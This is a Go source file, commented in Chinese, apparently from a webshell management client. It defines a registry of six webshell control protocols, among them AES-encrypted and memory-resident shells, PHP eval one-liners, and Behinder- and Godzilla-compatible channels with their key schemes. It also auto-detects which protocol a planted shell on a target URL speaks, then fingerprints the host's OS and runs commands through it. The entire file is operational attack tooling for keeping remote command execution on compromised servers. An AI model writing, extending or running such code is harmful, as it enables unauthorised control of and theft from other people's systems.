// 协议注册表 + 连接自动识别(移植自 dsh,PHP 系 + 通用通道)。
// 识别顺序:dsh-aes → dsh-mem → cmd-eval → cmd-system → behinder → godzilla。
// Java/.NET 编译载荷通道(behinder-java 等 5 通道)未移植——ARTEX 一期不含。
package webshellproto

import (
	"strings"
)

// ProtocolMeta 协议元信息(UI 选择器用)。
type ProtocolMeta struct {
	ID     string            `json:"id"`
	Label  string            `json:"label"`
	Langs  []string          `json:"langs"`
	Caps   map[string]string `json:"caps"`
	Kinds  []string          `json:"kinds"`
	Fields []string          `json:"fields"`
	Note   string            `json:"note"`
}

// Registry 全部通道元信息。
var Registry = []ProtocolMeta{
	{
		ID: "dsh-aes", Label: "自研加密通道",
		Langs: []string{"php", "jsp", "aspx"},
		Caps:  map[string]string{"cmd": "true", "code": "v2", "b64rw": "true"},
		Kinds: []string{"file"}, Fields: []string{"encoding"},
		Note:  "X-T 头密钥 + AES-128-CBC + c/u/d(/e) 操作码;v2 马带 eval 能力。",
	},
	{
		ID: "dsh-mem", Label: "内存马通道(X-C 头触发)",
		Langs: []string{"jsp", "aspx"},
		Caps:  map[string]string{"cmd": "true", "code": "false", "b64rw": "false"},
		Kinds: []string{"mem"}, Fields: []string{"encoding"},
		Note:  "URL 填任意存活路径;X-C 头执行,回显 b64(stdout)[|stderr];文件操作走命令翻译。",
	},
	{
		ID: "cmd-eval", Label: "一句话(eval 通道)",
		Langs: []string{"php"},
		Caps:  map[string]string{"cmd": "true", "code": "true", "b64rw": "false"},
		Kinds: []string{"file"}, Fields: []string{"pass_param", "password", "method", "encoding"},
		Note:  "eval($_POST[x]) 形马(含蚁剑默认马语义);结构化操作走 PHP 片段。",
	},
	{
		ID: "cmd-system", Label: "一句话(命令通道)",
		Langs: []string{"php", "jsp", "aspx", "asp"},
		Caps:  map[string]string{"cmd": "true", "code": "false", "b64rw": "false"},
		Kinds: []string{"file"}, Fields: []string{"pass_param", "cmd_param", "password", "method", "encoding"},
		Note:  "口令门 + 命令参数马;文件/数据库走命令翻译。",
	},
	{
		ID: "behinder", Label: "冰蝎型通道(AES-ECB)",
		Langs: []string{"php"},
		Caps:  map[string]string{"cmd": "true", "code": "true", "b64rw": "false"},
		Kinds: []string{"file"}, Fields: []string{"password", "encoding"},
		Note:  "key=md5(密码)[0:16];桥接载荷提供完整 eval 能力(结构化文件/数据库可用)。",
	},
	{
		ID: "godzilla", Label: "哥斯拉型通道(PHP_XOR_BASE64)",
		Langs: []string{"php"},
		Caps:  map[string]string{"cmd": "true", "code": "true", "b64rw": "false"},
		Kinds: []string{"file"}, Fields: []string{"password", "secret_key", "encoding"},
		Note:  "password=POST 参数名,secret_key=密钥源(key=md5(secretKey)[0:16]);桥接载荷同冰蝎。",
	},
}

var detectOrder = []string{"dsh-aes", "dsh-mem", "cmd-eval", "cmd-system", "behinder", "godzilla"}

// DetectAttempt 单通道探测结果。
type DetectAttempt struct {
	Protocol string `json:"protocol"`
	Error    string `json:"error,omitempty"`
}

// DetectResult 协议自动识别结果。
type DetectResult struct {
	Hit       bool            `json:"hit"`
	Protocol  string          `json:"protocol,omitempty"`
	ShellLang string          `json:"shell_lang,omitempty"`
	ExecMode  string          `json:"exec_mode,omitempty"`
	OS        string          `json:"os,omitempty"`
	BasicInfo map[string]any  `json:"basic_info,omitempty"`
	SuffixHint string         `json:"suffix_hint,omitempty"`
	KindHint  string          `json:"kind_hint,omitempty"`
	Error     string          `json:"error,omitempty"`
	Attempts  []DetectAttempt `json:"attempts"`
}

// suffixLang 文件后缀 → 语言提示。
func suffixLang(rawURL string) string {
	lower := strings.ToLower(rawURL)
	for _, ext := range []string{"php3", "php4", "php5", "php", "jsp", "jspx", "asp", "aspx", "ashx", "asmx"} {
		if strings.Contains(lower, "."+ext) {
			switch {
			case strings.HasPrefix(ext, "php"):
				return "php"
			case strings.HasPrefix(ext, "jsp"):
				return "jsp"
			case ext == "ashx" || ext == "asmx" || ext == "aspx":
				return "aspx"
			default:
				return ext
			}
		}
	}
	return ""
}

// DetectProtocol 协议自动识别:给定 url + 凭据逐个探测。
func DetectProtocol(spec *Conn) *DetectResult {
	attempts := []DetectAttempt{}
	conn := &Conn{}
	*conn = *spec
	conn.Encoding = "auto"
	conn.TimeoutMs = minInt(conn.TimeoutMs, 15000)
	if conn.TimeoutMs <= 0 {
		conn.TimeoutMs = 8000
	}
	if strings.TrimSpace(conn.URL) == "" {
		return &DetectResult{Hit: false, Error: "url 不能为空", Attempts: attempts}
	}

	probeOne := func(protocol string) bool {
		// 每协议独立 scope——前序探针的 session/cookie 不干扰后续
		scoped := &Conn{}
		*scoped = *conn
		scoped.Scope = "detect-" + protocol
		var ok bool
		switch protocol {
		case "dsh-aes":
			ok = DshAesProbe(scoped)
		case "dsh-mem":
			ok = DshMemProbe(scoped)
		case "cmd-eval":
			ok = CmdEvalProbe(scoped)
		case "cmd-system":
			ok = CmdSystemProbe(scoped)
		case "behinder":
			ok = BehinderProbe(scoped)
		case "godzilla":
			ok = GodzillaProbe(scoped)
		}
		if !ok {
			ClearCookies(scoped.scopeKey())
			GodzillaInvalidate(scoped.scopeKey())
			return false
		}
		return true
	}

	for _, protocol := range detectOrder {
		if !probeOne(protocol) {
			attempts = append(attempts, DetectAttempt{Protocol: protocol, Error: "无 token 回显"})
			continue
		}
		// 命中:OS + 基本信息(失败不阻断登记)
		found := &Conn{}
		*found = *conn
		found.Protocol = protocol
		found.Scope = "detect-" + protocol
		switch protocol {
		case "cmd-system":
			found.ExecMode = "system"
		case "cmd-eval":
			found.ExecMode = "eval"
			found.ShellLang = "php"
		case "behinder", "godzilla":
			found.ShellLang = "php"
		case "dsh-mem":
			if suffixLang(conn.URL) == "aspx" {
				found.ShellLang = "aspx"
			} else {
				found.ShellLang = "jsp"
			}
		}
		osName := ""
		if v, err := OSOf(found); err == nil {
			osName = v
		}
		info, _ := BasicInfo(found)
		if osName == "" && info != nil {
			if fam, ok := info["osFamily"].(string); ok && fam == "Windows" {
				osName = "windows"
			} else if _, ok := info["os"]; ok && osName == "" {
				if s := asString(info["os"]); strings.Contains(strings.ToLower(s), "win") {
					osName = "windows"
				} else if s != "" {
					osName = "linux"
				}
			}
		}
		if osName == "" {
			osName = "auto"
		}
		kindHint := "file"
		if protocol == "dsh-mem" {
			kindHint = "mem"
		} else if suffixLang(conn.URL) == "" {
			kindHint = "file"
		}
		lang := found.ShellLang
		if lang == "" {
			lang = suffixLang(conn.URL)
		}
		if lang == "" {
			lang = "php"
		}
		// 探测缓存清理(避免 detect scope 污染正式连接缓存)
		InvalidateDetect(found)
		return &DetectResult{
			Hit: true, Protocol: protocol, ShellLang: lang, ExecMode: found.ExecMode,
			OS: osName, BasicInfo: info, SuffixHint: suffixLang(conn.URL), KindHint: kindHint,
			Attempts: attempts,
		}
	}
	return &DetectResult{Hit: false, Error: "全部通道探测未命中——检查 URL/口令/盐与马类型是否匹配", Attempts: attempts}
}

// InvalidateDetect 清理探测期的会话态与缓存。
func InvalidateDetect(conn *Conn) {
	ClearCookies(conn.scopeKey())
	GodzillaInvalidate(conn.scopeKey())
}

// ProbeConnection 连接探活(已登记连接的刷新)。
func ProbeConnection(conn *Conn) (string, map[string]any, error) {
	out, err := RunCommand(conn, OSProbeCommand)
	if err != nil {
		return "", nil, err
	}
	osName := ParseOsProbe(out)
	info, _ := BasicInfo(conn)
	if osName == "" && info != nil {
		if fam, ok := info["osFamily"].(string); ok && fam == "Windows" {
			osName = "windows"
		}
	}
	if osName == "" {
		osName = "auto"
	}
	return osName, info, nil
}
